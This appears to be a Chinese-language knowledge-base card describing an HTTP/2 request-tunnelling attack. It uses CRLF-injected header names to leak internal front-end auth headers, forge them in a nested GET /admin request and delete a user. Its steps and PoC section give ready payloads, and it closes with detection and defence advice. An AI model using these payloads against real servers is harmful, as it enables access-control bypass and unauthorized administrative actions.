---
id: web-generic-http-smuggling-h2-request-tunnelling-access-control-bypass
title: HTTP/2 请求隧道绕过前端访问控制：走私嵌套请求并伪造前端内部认证头，读取 /admin 执行管理员操作
type: scenario
domain: web
path: web/generic/http-smuggling
technique: http2-request-tunnelling-acl-bypass
tags:
- http2
- request-tunnelling
- access-control-bypass
- crlf-injection
- header-leak
- desync
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V609
  verified_at: '2026-11-12T19:38:51+08:00'
  notes: '已对照原文12691「请求隧道/头部泄露」节及截图39-47核对：隧道原理图、头名注入foo: bar\r\nHost: abc导致504 Gateway Timeout connecting to abc、注入Content-Length:500泄漏Content-Length:840/X-SSL-VERIFIED:0/X-SSL-CLIENT-CN:null/X-FRONTEND-KEY:2244638774928226、HEAD嵌套GET /admin并伪造三项内部认证头、长度不足报Received only 174 of expected 3296 bytes、改:path到/login读取较短资源、最终删carlos，卡内步骤与参数同原文截图一致(HEAD方法亦与原文“改为HEAD”一致)。dedup：除自身外最高相关为pause-based desync、CSD、Host连接状态、CL.0等，均不同链；与缓存投毒隧道卡同原语但目标/触发/危害不同(前者ACL绕过与内部头泄漏，后者需缓存与反射点)，原子。原文未给产品版本，保持省略；未在本机复现。'
url: /docs/web/generic/http-smuggling/web-generic-http-smuggling-h2-request-tunnelling-access-control-bypass/
draft: false
kb_aliases:
- HTTP/2 request tunnelling
- 请求隧道
- request tunnelling access control bypass
- 内部头泄露
- X-SSL-VERIFIED 伪造
---

## 一句话结论

当前端不复用后端连接（传统响应队列中毒失效）时，仍可发一个请求让后端返回两个响应，并把第二个响应藏进第一个响应的 body 里；利用这一点先泄漏前端自动加给后端的内部认证头（如 `X-SSL-VERIFIED`、`X-SSL-CLIENT-CN`、`X-FRONTEND-KEY`），再隧道一个带伪造内部头的 `GET /admin`，前端只看到外部请求而放行，后端却以管理员身份处理嵌套请求，实现访问控制绕过。

## 原理

- 请求隧道的前提是前后端对"头部在哪里结束"产生分歧：攻击者在 H2 头名/头值里用 CRLF 注入 `\r\n\r\n`，前端仍把它当作头的一部分，后端则把它当作头部结束，后面的内容成为 body——而这个 body 里其实是一条完整的 HTTP/1 请求。
- 后端会处理嵌套请求并生成响应，但前端只等待一个响应；嵌套响应被当作外层响应 body 的一部分返回给攻击者。于是攻击者能"隔着前端"访问只有后端能访问的端点，且前端基于 URL/路径的 ACL 只检查外层请求，看不到嵌套请求。
- 该技术不要求前端复用连接：即使前端为每个请求新建后端连接，攻击者仍能在一个请求内完成"发送嵌套请求 + 读取嵌套响应"。
- 内部头泄漏：前端常在转发时向后端追加认证头（mTLS 校验结果、前端密钥等）。先构造一个 `Content-Length` 被注入、body 被填充到足够长的隧道请求，让外层响应 body 包含被截断的"下一个请求的头部"，就能读到这些内部头的名称和值。
- 为什么成立：信任边界放在前端，后端却直接接受前端注入的认证头；攻击者一旦能控制嵌套请求，就能自行复制这些头，后端无法区分"前端加的"和"攻击者伪造的"。
- H2 中每个 stream 理论上只应有一个请求和一个响应，若响应 body 里出现 `HTTP/1.1 200 OK`，即可确认隧道成功。

## 触发条件

- 前端接受 HTTP/2 并降级 HTTP/1.1 转发，未清理头名/头值中的 CRLF。
- 后端接受前端注入的认证头（如 `X-SSL-VERIFIED`、`X-SSL-CLIENT-CN`、`X-FRONTEND-KEY`）作为授权依据。
- 前端 ACL 只检查外层请求路径/方法，不解析 body 中的嵌套请求。
- 攻击者能构造外层 `Content-Length` 与 body 长度，使嵌套响应落在读取范围内。
- 不需要前后端连接复用（这正是与响应队列中毒的区别）。

## 利用步骤

1. 证明 CRLF 注入：在 H2 请求头名中写 `foo: bar\r\nHost: abc`，发送后若响应显示尝试连接 `abc`（如 Gateway Timeout），说明头名中的 CRLF 生效。
2. 泄漏内部头：发送 `POST /`，头名 `foo: bar\r\nContent-Length: 500\r\n\r\nsearch=x`，并在 body 中追加大量任意字符，使实际请求长度超过注入的 500；响应 body 会包含外层请求的剩余头信息，原文读到 `Content-Length: 840`、`X-SSL-VERIFIED: 0`、`X-SSL-CLIENT-CN: null`、`X-FRONTEND-KEY: <值>`。
3. 构造嵌套 admin 请求：方法改为 HEAD/GET，头名写入 `foo: bar\r\n\r\nGET /admin HTTP/1.1\r\nX-SSL-VERIFIED: 1\r\nX-SSL-CLIENT-CN: administrator\r\nX-FRONTEND-KEY: <泄漏值>\r\n\r\n`，值随便填。
4. 处理长度错位：外层 `Content-Length` 比嵌套响应大时会报 `Received only N of expected M bytes`；把 `:path` 改到返回较短资源的端点（如 `/login`），或调整外层 CL/body 填充，使读取完整。
5. 在响应中找到 `/admin` 页面里的删除用户链接（如 `/admin/delete?username=carlos`），把嵌套请求路径改成它并重发，完成管理员操作。

## PoC

```http
POST / HTTP/2
Host: TARGET
foo: bar\r\n
Content-Length: 500\r\n
\r\n
search=x
<大量填充字符，使请求总长超过 500>
```

```http
HEAD /login HTTP/2
Host: TARGET
foo: bar\r\n
\r\n
GET /admin HTTP/1.1\r\n
X-SSL-VERIFIED: 1\r\n
X-SSL-CLIENT-CN: administrator\r\n
X-FRONTEND-KEY: <leaked-value>\r\n
\r\n
```

说明：PoC 为原文请求隧道靶场流程的结构化复现，`\r\n` 需作为头名/头值的真实字节，前端密钥与域名已泛化；未在本机执行，仅用于授权测试。

## 变体与关联

- 变体：只做内部头泄漏（不访问 admin）即可用于后续伪造；泄漏的可能是租户 ID、用户身份、内部路由键、签名密钥。
- 变体：把嵌套请求指向内部管理端口/服务，形成 SSRF 式访问；或与外层缓存结合做缓存投毒。
- 关联：[[web-generic-http-smuggling-h2-request-tunnelling-cache-poisoning-xss]]（隧道 + 缓存投毒）、[[web-generic-http-smuggling-h2-request-splitting-crlf-host-header]]（请求拆分）、[[web-generic-http-smuggling-h2-response-queue-poisoning-session-capture]]（需要连接复用的另一类响应劫持）。
- 边界：前端清理 CRLF、后端不信任前端认证头而自行校验客户端证书、或前端解析嵌套请求并阻断时，本链不成立。

## 检测与防御

- 检测：H2 头名/头值中的 CRLF；响应 body 中出现嵌套 `HTTP/1.1` 响应；同一 H2 stream 出现多个 HTTP 响应；后端收到带有管理员认证头的非管理员来源请求。
- 防御：前端拒绝头名/头值中的 CR、LF、NUL；后端不要仅凭前端追加的头做认证，应使用 mTLS/签名令牌并校验来源；前端 ACL 应同时校验方法、路径与请求体结构。
- 加固：端到端 HTTP/2；统一请求解析实现；WAF 检测嵌套 HTTP 响应与异常 Content-Length；对内部认证头做端到端完整性保护。
